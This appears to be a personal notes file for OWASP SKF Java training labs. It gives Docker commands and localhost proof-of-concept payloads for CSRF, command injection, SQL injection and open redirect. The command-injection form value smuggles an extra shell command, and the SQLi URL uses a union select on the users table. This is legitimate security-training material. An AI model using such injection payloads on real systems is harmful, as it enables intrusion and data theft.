## blabla1337/owasp-skf-lab:java-csrf

```bash
docker run -p5000:5000 blabla1337/owasp-skf-lab:java-csrf
```

spring-boot
-> admin/admin -> src/main/resources/data.sql


```bash
curl 'http://localhost:5000/update' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: JSESSIONID=DA8353D048C3C8B90D33596A10B2B360' \
  --data-raw 'color=yellow2'
```

## blabla1337/owasp-skf-lab:java-cmd

docker run -p5000:5000 blabla1337/owasp-skf-lab:java-cmd

drop malicious payload in remote filesystem
```bash
curl 'http://localhost:5000/home' \
   -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQJEtZoqQ8I4ZmYVs' \
  --data-raw $'------WebKitFormBoundaryQJEtZoqQ8I4ZmYVs\r\nContent-Disposition: form-data; name="size"\r\n\r\n1;echo hi>/tmp/out;\r\n------WebKitFormBoundaryQJEtZoqQ8I4ZmYVs--\r\n' \
```

## blabla1337/owasp-skf-lab:java-sqli

exploit
`http://localhost:5000/home/1%20union%20select%20*%20from%20users`

## blabla1337/owasp-skf-lab:java-url-redirection-harder

ZAProxy gave me:
`http://localhost:5000/redirect?newurl=https%3A%2F%2F7289221068653968432%252eowasp%252eorg`
